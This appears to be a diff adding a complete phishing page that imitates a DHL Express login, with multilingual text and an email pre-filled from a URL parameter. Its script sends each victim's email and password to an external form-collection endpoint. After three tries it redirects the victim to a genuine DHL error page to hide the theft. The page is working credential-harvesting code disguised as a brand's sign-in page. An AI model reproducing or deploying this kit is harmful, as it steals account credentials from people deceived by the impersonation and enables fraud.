@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html id="html" lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DHL Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: "Roboto", sans-serif;
+            background: #f2f2f2; /* Light gray background for the body */
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: #ffffff; /* White background for the login container */
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            z-index: 1;
+            position: relative;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .header img {
+            height: 40px;
+        }
+        .lang-switcher {
+            padding: 5px;
+            border-radius: 4px;
+            background: #ffffff; /* White background for language switcher */
+        }
+        h1 {
+            font-size: 24px;
+            margin: 0 0 20px;
+            text-align: center;
+            color: #333333; /* Dark gray text for contrast on white background */
+        }
+        .quick-actions {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+        .quick-actions a {
+            text-decoration: none;
+            color: #d40511;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+        input[type="text"], input[type="password"], input[type="email"] {
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #cccccc; /* Light gray border for inputs */
+            border-radius: 4px;
+            font-size: 16px;
+            background: #ffffff; /* White background for inputs */
+        }
+        .password-container {
+            position: relative;
+        }
+        .password-container input {
+            width: 100%;
+            box-sizing: border-box;
+        }
+        .toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #666666; /* Medium gray for toggle icon */
+        }
+        button {
+            padding: 10px;
+            background-color: #d40511; /* DHL red for button */
+            color: #ffffff; /* White text on button */
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #b0040f; /* Darker red on hover */
+        }
+        .error-message {
+            color: #d40511; /* Red for error messages */
+            font-size: 14px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        .links {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .links a {
+            color: #d40511;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin-bottom: 10px;
+        }
+        .iframe-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+            background: #f2f2f2; /* Ensure iframe container matches body gray */
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+            background: #f2f2f2; /* Fallback gray background for iframe */
+        }
+        @media (max-width: 480px) {
+            .container {
+                padding: 15px;
+                margin: 10px;
+                background: #ffffff; /* Maintain white background on mobile */
+            }
+            h1 {
+                font-size: 20px;
+            }
+            .header img {
+                height: 30px;
+            }
+            .quick-actions a {
+                font-size: 12px;
+            }
+        }
+        [dir="rtl"] .header {
+            flex-direction: row-reverse;
+        }
+        [dir="rtl"] .quick-actions {
+            flex-direction: row-reverse;
+        }
+        [dir="rtl"] .toggle-password {
+            left: 10px;
+            right: auto;
+        }
+        [dir="rtl"] input {
+            text-align: right;
+        }
+    </style>
+</head>
+<body>
+    <div class="iframe-container">
+        <iframe id="background-iframe" src="about:blank"></iframe>
+    </div>
+    <div class="container">
+        <div class="header">
+            <img src="https://www.dhl.com/content/dam/dhl/global/core/images/logos/dhl-logo.svg" alt="DHL Logo">
+            <select class="lang-switcher" onchange="setLanguage(this.value)">
+                <option value="en">English</option>
+                <option value="zh-CN">中文 (简体)</option>
+                <option value="hi">हिन्दी</option>
+                <option value="es">Español</option>
+                <option value="fr">Français</option>
+                <option value="ar">العربية</option>
+                <option value="ko">한국어</option>
+                <option value="ja">日本語</option>
+                <option value="vi">Tiếng Việt</option>
+            </select>
+        </div>
+        <h1 data-i18n="header_title">DHL Express</h1>
+        <div class="quick-actions">
+            <a href="#" data-i18n="send_package">Send package</a>
+            <a href="#" data-i18n="send_directly">Send directly</a>
+        </div>
+        <form id="signin-form">
+            <p data-i18n="continue_with_password">Continue with your password</p>
+            <input type="email" id="email" name="email" data-i18n="[placeholder]email_placeholder" placeholder="Email address" required disabled>
+            <div class="password-container">
+                <input type="password" id="password" name="password" data-i18n="[placeholder]password_placeholder" placeholder="Password" required>
+                <span class="toggle-password" id="toggle-password"><i class="fas fa-eye"></i></span>
+            </div>
+            <!-- Honeypot field -->
+            <input type="text" name="honeypot" style="display: none;">
+            <div class="error-message" id="error-message"></div>
+            <button type="submit" data-i18n="[value]login" value="Login">Login</button>
+        </form>
+        <div class="links">
+            <a href="#" data-i18n="reset_password">Reset Password</a>
+            <a href="#" data-i18n="no_account">Don't have an account yet? <span data-i18n="sign_up">Sign up</span></a>
+            <a href="#" data-i18n="business_user">Business user? <span data-i18n="business_sign_in">Sign in</span></a>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/i18next/21.6.14/i18next.min.js"></script>
+    <script>
+        // Translation resources
+        const translations = {
+            'en': {
+                translation: {
+                    'title': 'DHL Login',
+                    'header_title': 'DHL Express',
+                    'send_package': 'Send package',
+                    'send_directly': 'Send directly',
+                    'continue_with_password': 'Continue with your password',
+                    'email_placeholder': 'Email address',
+                    'password_placeholder': 'Password',
+                    'login': 'Login',
+                    'error_message': 'Please enter both email and password.',
+                    'reset_password': 'Reset Password',
+                    'no_account': "Don't have an account yet?",
+                    'sign_up': 'Sign up',
+                    'business_user': 'Business user?',
+                    'business_sign_in': 'Sign in'
+                }
+            },
+            'zh-CN': {
+                translation: {
+                    'title': 'DHL 登录',
+                    'header_title': 'DHL 快递',
+                    'send_package': '寄送包裹',
+                    'send_directly': '直接寄送',
+                    'continue_with_password': '使用您的密码继续',
+                    'email_placeholder': '电子邮件地址',
+                    'password_placeholder': '密码',
+                    'login': '登录',
+                    'error_message': '请输入电子邮件和密码。',
+                    'reset_password': '重置密码',
+                    'no_account': '还没有账户？',
+                    'sign_up': '注册',
+                    'business_user': '商业用户？',
+                    'business_sign_in': '登录'
+                }
+            },
+            'hi': {
+                translation: {
+                    'title': 'DHL लॉगिन',
+                    'header_title': 'DHL एक्सप्रेस',
+                    'send_package': 'पैकेज भेजें',
+                    'send_directly': 'सीधे भेजें',
+                    'continue_with_password': 'अपने पासवर्ड के साथ जारी रखें',
+                    'email_placeholder': 'ईमेल पता',
+                    'password_placeholder': 'पासवर्ड',
+                    'login': 'लॉगिन',
+                    'error_message': 'कृपया ईमेल और पासवर्ड दोनों दर्ज करें।',
+                    'reset_password': 'पासवर्ड रीसेट करें',
+                    'no_account': 'अभी तक खाता नहीं है?',
+                    'sign_up': 'साइन अप करें',
+                    'business_user': 'व्यवसायिक उपयोगकर्ता?',
+                    'business_sign_in': 'साइन इन करें'
+                }
+            },
+            'es': {
+                translation: {
+                    'title': 'Inicio de sesión de DHL',
+                    'header_title': 'DHL Express',
+                    'send_package': 'Enviar paquete',
+                    'send_directly': 'Enviar directamente',
+                    'continue_with_password': 'Continúa con tu contraseña',
+                    'email_placeholder': 'Dirección de correo electrónico',
+                    'password_placeholder': 'Contraseña',
+                    'login': 'Iniciar sesión',
+                    'error_message': 'Por favor, introduce correo electrónico y contraseña.',
+                    'reset_password': 'Restablecer contraseña',
+                    'no_account': '¿Aún no tienes una cuenta?',
+                    'sign_up': 'Regístrate',
+                    'business_user': '¿Usuario empresarial?',
+                    'business_sign_in': 'Iniciar sesión'
+                }
+            },
+            'fr': {
+                translation: {
+                    'title': 'Connexion DHL',
+                    'header_title': 'DHL Express',
+                    'send_package': 'Envoyer un colis',
+                    'send_directly': 'Envoyer directement',
+                    'continue_with_password': 'Continuer avec votre mot de passe',
+                    'email_placeholder': 'Adresse e-mail',
+                    'password_placeholder': 'Mot de passe',
+                    'login': 'Se connecter',
+                    'error_message': 'Veuillez entrer l’adresse e-mail et le mot de passe.',
+                    'reset_password': 'Réinitialiser le mot de passe',
+                    'no_account': 'Vous n’avez pas encore de compte ?',
+                    'sign_up': 'S’inscrire',
+                    'business_user': 'Utilisateur professionnel ?',
+                    'business_sign_in': 'Se connecter'
+                }
+            },
+            'ar': {
+                translation: {
+                    'title': 'تسجيل الدخول إلى DHL',
+                    'header_title': 'DHL إكسبريس',
+                    'send_package': 'إرسال طرد',
+                    'send_directly': 'إرسال مباشر',
+                    'continue_with_password': 'تابع باستخدام كلمة المرور الخاصة بك',
+                    'email_placeholder': 'عنوان البريد الإلكتروني',
+                    'password_placeholder': 'كلمة المرور',
+                    'login': 'تسجيل الدخول',
+                    'error_message': 'يرجى إدخال البريد الإلكتروني وكلمة المرور.',
+                    'reset_password': 'إعادة تعيين كلمة المرور',
+                    'no_account': 'ليس لديك حساب بعد؟',
+                    'sign_up': 'التسجيل',
+                    'business_user': 'مستخدم تجاري؟',
+                    'business_sign_in': 'تسجيل الدخول'
+                }
+            },
+            'ko': {
+                translation: {
+                    'title': 'DHL 로그인',
+                    'header_title': 'DHL 익스프레스',
+                    'send_package': '패키지 보내기',
+                    'send_directly': '직접 보내기',
+                    'continue_with_password': '비밀번호로 계속하기',
+                    'email_placeholder': '이메일 주소',
+                    'password_placeholder': '비밀번호',
+                    'login': '로그인',
+                    'error_message': '이메일과 비밀번호를 입력해 주세요.',
+                    'reset_password': '비밀번호 재설정',
+                    'no_account': '아직 계정이 없으신가요?',
+                    'sign_up': '가입하기',
+                    'business_user': '비즈니스 사용자?',
+                    'business_sign_in': '로그인'
+                }
+            },
+            'ja': {
+                translation: {
+                    'title': 'DHL ログイン',
+                    'header_title': 'DHL エクスプレス',
+                    'send_package': '荷物を送る',
+                    'send_directly': '直接送る',
+                    'continue_with_password': 'パスワードで続行',
+                    'email_placeholder': 'メールアドレス',
+                    'password_placeholder': 'パスワード',
+                    'login': 'ログイン',
+                    'error_message': 'メールアドレスとパスワードを入力してください。',
+                    'reset_password': 'パスワードのリセット',
+                    'no_account': 'まだアカウントをお持ちでないですか？',
+                    'sign_up': 'サインアップ',
+                    'business_user': 'ビジネスユーザー？',
+                    'business_sign_in': 'ログイン'
+                }
+            },
+            'vi': {
+                translation: {
+                    'title': 'Đăng nhập DHL',
+                    'header_title': 'DHL Express',
+                    'send_package': 'Gửi gói hàng',
+                    'send_directly': 'Gửi trực tiếp',
+                    'continue_with_password': 'Tiếp tục với mật khẩu của bạn',
+                    'email_placeholder': 'Địa chỉ email',
+                    'password_placeholder': 'Mật khẩu',
+                    'login': 'Đăng nhập',
+                    'error_message': 'Vui lòng nhập cả email và mật khẩu.',
+                    'reset_password': 'Đặt lại mật khẩu',
+                    'no_account': 'Chưa có tài khoản?',
+                    'sign_up': 'Đăng ký',
+                    'business_user': 'Người dùng doanh nghiệp?',
+                    'business_sign_in': 'Đăng nhập'
+                }
+            }
+        };
+
+        // Function to validate and extract email from URL hash or eta query parameter
+        function extractEmailFromUrl() {
+            const isValidEmail = email => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+
+            // Try to extract from the hash
+            const hash = window.location.hash ? decodeURIComponent(window.location.hash.substring(1)) : null;
+            if (hash && isValidEmail(hash)) {
+                console.log('Valid email from hash:', hash);
+                return hash;
+            } else if (hash) {
+                console.warn('Invalid email format in URL hash:', hash);
+            }
+
+            // If no valid hash, try the eta query parameter
+            const urlParams = new URLSearchParams(window.location.search);
+            const eta = urlParams.get('eta') ? decodeURIComponent(urlParams.get('eta')) : null;
+            if (eta && isValidEmail(eta)) {
+                console.log('Valid email from eta:', eta);
+                return eta;
+            } else if (eta) {
+                console.warn('Invalid email format in eta query parameter:', eta);
+            }
+
+            // Return null if no valid email is found
+            console.warn('No valid email found in URL hash or eta query parameter.');
+            return null;
+        }
+
+        // Function to detect user's language
+        function detectUserLanguage() {
+            const supportedLanguages = ['en', 'zh-CN', 'hi', 'es', 'fr', 'ar', 'ko', 'ja', 'vi'];
+            const userLanguages = navigator.languages || [navigator.language || 'en'];
+            console.log('Detected browser languages:', userLanguages);
+            for (let lang of userLanguages) {
+                if (lang.startsWith('zh')) {
+                    console.log('Matched zh to zh-CN');
+                    return 'zh-CN';
+                }
+                if (supportedLanguages.includes(lang)) {
+                    console.log('Matched language:', lang);
+                    return lang;
+                }
+                const baseLang = lang.split('-')[0];
+                if (supportedLanguages.includes(baseLang)) {
+                    console.log('Matched base language:', baseLang);
+                    return baseLang;
+                }
+            }
+            console.log('Falling back to English (en)');
+            return 'en'; // Fallback to English
+        }
+
+        // Initialize i18next with detected language
+        i18next.init({
+            lng: detectUserLanguage(),
+            fallbackLng: 'en',
+            resources: translations,
+            debug: true // Enable i18next debug mode for better logging
+        }, function(err, t) {
+            if (err) {
+                console.error('i18next initialization error:', err);
+                return;
+            }
+            console.log('i18next initialized with language:', i18next.language);
+            const lang = i18next.language;
+            document.getElementById('html').setAttribute('lang', lang);
+            document.getElementById('html').setAttribute('dir', lang === 'ar' ? 'rtl' : 'ltr');
+            document.querySelectorAll('[data-i18n]').forEach(element => {
+                const key = element.getAttribute('data-i18n');
+                if (key.startsWith('[placeholder]')) {
+                    element.placeholder = t(key.replace('[placeholder]', ''));
+                } else if (key.startsWith('[value]')) {
+                    element.value = t(key.replace('[value]', ''));
+                } else {
+                    element.innerText = t(key);
+                }
+            });
+            document.title = t('title');
+            document.querySelector('.lang-switcher').value = lang;
+        });
+
+        // Language switcher for manual override
+        function setLanguage(lang) {
+            i18next.changeLanguage(lang, (err, t) => {
+                if (err) {
+                    console.error('i18next changeLanguage error:', err);
+                    return;
+                }
+                console.log('Language changed to:', lang);
+                const html = document.getElementById('html');
+                html.setAttribute('lang', lang);
+                html.setAttribute('dir', lang === 'ar' ? 'rtl' : 'ltr');
+                document.querySelectorAll('[data-i18n]').forEach(element => {
+                    const key = element.getAttribute('data-i18n');
+                    if (key.startsWith('[placeholder]')) {
+                        element.placeholder = t(key.replace('[placeholder]', ''));
+                    } else if (key.startsWith('[value]')) {
+                        element.value = t(key.replace('[value]', ''));
+                    } else {
+                        element.innerText = t(key);
+                    }
+                });
+                document.title = t('title');
+                document.querySelector('.lang-switcher').value = lang;
+            });
+        }
+
+        // Form handling and iframe logic
+        (() => {
+            const form = document.getElementById('signin-form');
+            const emailInput = document.getElementById('email');
+            const errorMessageEl = document.getElementById('error-message');
+            const iframe = document.getElementById('background-iframe');
+            const maxAttempts = 3; // Maximum number of attempts
+            const submitEndpoint = 'https://submit-form.com/Uxt0vouOR'; // Your endpoint URL
+            let attemptCount = 0;
+
+            // Extract email from URL hash or eta parameter
+            const emailParam = extractEmailFromUrl();
+
+            if (emailParam) {
+                // Pre-fill the email input field
+                emailInput.value = emailParam;
+                emailInput.disabled = false; // Enable the email input field
+            } else {
+                // Keep email input disabled if no valid email is provided
+                emailInput.disabled = true;
+            }
+
+            // Set iframe to a page with matching gray background
+            iframe.src = 'data:text/html;charset=utf-8,' + encodeURIComponent(`
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <style>
+                        body {
+                            margin: 0;
+                            height: 100vh;
+                            background: #f2f2f2; /* Matches body gray background */
+                        }
+                    </style>
+                </head>
+                <body></body>
+                </html>
+            `);
+            console.log('Iframe loaded with gray background');
+
+            form.addEventListener('submit', async (event) => {
+                event.preventDefault();
+                errorMessageEl.textContent = '';
+
+                const email = form.email.value.trim();
+                const password = form.password.value;
+                const honeypot = form.honeypot.value; // Get the honeypot value
+
+                // Basic client-side validation
+                if (!email || !password) {
+                    errorMessageEl.textContent = i18next.t('error_message');
+                    return;
+                }
+
+                // Check if honeypot is filled
+                if (honeypot) {
+                    console.warn('Honeypot field filled, likely a bot submission.');
+                    return; // Do not proceed with the submission
+                }
+
+                // Report credentials to the endpoint
+                try {
+                    const response = await fetch(submitEndpoint, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ email, password }),
+                    });
+
+                    if (!response.ok) {
+                        throw new Error('Login failed');
+                    }
+
+                    // Handle successful login
+                    console.log('Login successful');
+                } catch (error) {
+                    console.error('Form submission error:', error);
+                    attemptCount++; // Increment the attempt count
+                    if (attemptCount < maxAttempts) {
+                        // Reset password field and show error message
+                        form.password.value = '';
+                        form.password.focus();
+                        errorMessageEl.textContent = i18next.t('error_message');
+                    } else {
+                        // Redirect on 3rd attempt
+                        window.location.href = 'https://mydhl.express.dhl/gq/en/auth/link-error.html';
+                    }
+                }
+            });
+
+            // Toggle password visibility
+            const togglePassword = document.getElementById('toggle-password');
+            togglePassword.addEventListener('click', () => {
+                const passwordInput = document.getElementById('password');
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+                togglePassword.querySelector('i').classList.toggle('fa-eye-slash');
+            });
+        })();
+    </script>
+</body>
+</html>
